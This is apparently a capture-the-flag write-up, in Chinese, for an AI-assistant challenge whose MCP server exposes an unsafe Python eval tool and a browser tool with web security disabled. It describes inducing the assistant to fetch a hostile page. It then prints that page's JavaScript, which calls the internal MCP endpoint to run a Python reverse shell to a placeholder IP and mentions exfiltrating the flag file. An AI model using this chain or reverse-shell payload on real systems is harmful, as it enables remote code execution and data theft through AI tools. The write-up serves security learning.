# My Little Assistant

## 题目简述

题面是一个“智能助手”：能分析网页、访问外部资源，也能执行一些工具。附件是 MCP 服务代码，暴露 `py_eval` 和 `py_request` 两个工具。`py_eval` 会执行传入 Python 代码；`py_request` 会用 Playwright 打开外部 URL，并且 Chromium 启动参数包含 `--disable-web-security`。

```python
async def py_eval(code: str):
    local_vars = {}
    exec(code, {}, local_vars)
    return {"result": str(local_vars), "status": "success"}

async def py_request(url: str):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-web-security"]
        )
        page = await (await browser.new_context()).new_page()
        response = await page.goto(url, timeout=10000, wait_until="networkidle")
```

题目机制是 AI/前端/MCP 工具之间的信任边界，而不是普通表单漏洞。

## 解题过程

题目环境中存在前端聊天服务和内网 MCP 服务。AI 服务能直接调用 `py_request`，但正常交互中不能直接调用危险的 `py_eval`。关键点在于 `py_request` 使用禁用 Web 安全策略的 Playwright 访问外部 URL，因此外部页面脚本可以在浏览器上下文里向内网 MCP 服务发起请求。

利用链是：诱导 AI 调用 `py_request` 访问恶意页面，恶意页面中的 JavaScript 请求 `http://127.0.0.1:8001/mcp`，按 MCP JSON-RPC 格式调用 `tools/call`，工具名指定为 `py_eval`。`py_eval` 中可执行 Python 代码，因此可以直接读取 flag，也可以反弹 shell。

```javascript
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>exp</title>
</head>
<body>
    <div id="result">waiting...</div>
    <script type="module">
    const resultDiv = document.getElementById('result');
    try {
        const code = [
            "import os,socket,subprocess",
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
            "s.connect(('<your-ip>',2333))",
            "os.dup2(s.fileno(),0)",
            "os.dup2(s.fileno(),1)",
            "os.dup2(s.fileno(),2)",
            "subprocess.call(['/bin/bash','-i'])"
        ].join(";");
        const response = await fetch("http://127.0.0.1:8001/mcp", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                jsonrpc: "2.0",
                id: 2,
                method: "tools/call",
                params: {
                    name: "py_eval",
                    arguments: { code }
                }
            })
        });
        const data = await response.json();
        resultDiv.innerText = "success: " + JSON.stringify(data);
    } catch (error) {
        resultDiv.innerText = "error: " + error.message;
    }
</script>
</body>
</html>
```

上面的示例展示的是反弹 shell；若环境不方便出网，也可以把 `code` 改成读取 flag 文件并通过响应或回连通道带出。

## 方法总结

AI/MCP 类 Web 题要把工具权限、浏览器上下文和内网服务边界分开看。可调用的浏览器工具如果能访问任意页面，就可能成为 SSRF/XSS 载体；一旦同源或网络策略过宽，就能从页面脚本转向内网 MCP/JSON-RPC 工具调用。
